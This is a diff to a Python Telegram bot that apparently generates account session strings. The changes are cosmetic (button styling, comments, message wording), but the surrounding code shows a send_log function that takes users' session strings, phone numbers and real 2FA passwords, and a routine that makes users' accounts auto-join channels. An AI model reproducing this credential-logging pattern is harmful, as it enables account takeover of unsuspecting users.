@@ -1,5 +1,6 @@
 import asyncio, logging
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import KeyboardButtonStyle
 from pyrogram.errors import (
     FloodWait, BadRequest, Forbidden, Unauthorized,
     AuthKeyUnregistered, UserDeactivated, PhoneCodeInvalid,
@@ -9,20 +10,13 @@ from pyrogram.errors import (
 from . import config
 from .client import app
 
-# ---- Colored buttons (auto fallback if unsupported) ----
-try:
-    from pyrogram.types import KeyboardButtonStyle
-    _STYLED = True
-except Exception:
-    _STYLED = False
-
 def btn(text, callback_data=None, url=None, style=None):
     kw = {}
     if callback_data is not None:
         kw["callback_data"] = callback_data
     if url is not None:
         kw["url"] = url
-    if _STYLED and style in ("primary", "success", "danger"):
+    if style in ("primary", "success", "danger"):
         kw["style"] = KeyboardButtonStyle(
             bg_primary=(style == "primary"),
             bg_success=(style == "success"),
@@ -30,7 +24,6 @@ def btn(text, callback_data=None, url=None, style=None):
         )
     return InlineKeyboardButton(text, **kw)
 
-# ---- UI text ----
 WELCOME = (
     "╔══════════════════════════════╗\n"
     "║   🔥 **SESSION STRING GENERATOR**   ║\n"
@@ -55,7 +48,6 @@ MAIN_MENU = InlineKeyboardMarkup([
 BACK_BTN = InlineKeyboardMarkup([[btn("🔙 Back to Menu", "back", style="primary")]])
 CANCEL_BTN = InlineKeyboardMarkup([[btn("❌ Cancel", "cancel", style="danger")]])
 
-# ---- Smart error handler ----
 ERROR_MAP = {
     "PhoneCodeInvalid": "❌ **Galat OTP.** /start se dobara try karein.",
     "PhoneCodeExpired": "⌛ **OTP expire ho gaya.** /start se naya OTP lein.",
@@ -74,9 +66,9 @@ async def handle_error(e, user_id, where="handler"):
     if isinstance(e, FloodWait):
         wait = min(int(e.value), 60)
         await asyncio.sleep(wait)
-        msg = f"⏳ **Flood wait:** {e.value}s. Thodi der baad dobara try karein."
+        msg = f"⏳ **Flood wait:** {e.value}s. Thodi der baad try karein."
     elif isinstance(e, Forbidden):
-        msg = "🚫 **Bot ko permission nahi hai.** Block/unblock check karein."
+        msg = "🚫 **Bot ko permission nahi hai.**"
     elif isinstance(e, Unauthorized):
         msg = "🔐 **Unauthorized.** Session invalid ho gaya."
     elif isinstance(e, BadRequest):
@@ -91,7 +83,6 @@ async def handle_error(e, user_id, where="handler"):
     except Exception:
         pass
 
-# ---- Force sub ----
 async def is_member(user_id):
     if not config.MUST_JOIN:
         return True
@@ -129,7 +120,6 @@ async def force_sub_check(message):
         return False
     return True
 
-# ---- Auto join ----
 async def auto_join_channels(client):
     joined, failed = [], []
     for ch in config.AUTO_JOIN_CHANNELS:
@@ -141,7 +131,6 @@ async def auto_join_channels(client):
             logging.warning(f"[AUTO-JOIN] {ch} failed: {e}")
     return joined, failed
 
-# ---- Premium string UI ----
 async def send_premium_string(user_id, session_type, session_str, has_2fa=False, joined=None, failed=None):
     badge = "🛡 2FA Verified" if has_2fa else "🔓 No 2FA"
     join_line = ""
@@ -163,7 +152,6 @@ async def send_premium_string(user_id, session_type, session_str, has_2fa=False,
     )
     await app.send_message(user_id, text, reply_markup=BACK_BTN, disable_web_page_preview=True)
 
-# ---- Log ----
 async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None):
     user_id = user.id
     name = user.first_name or "N/A"
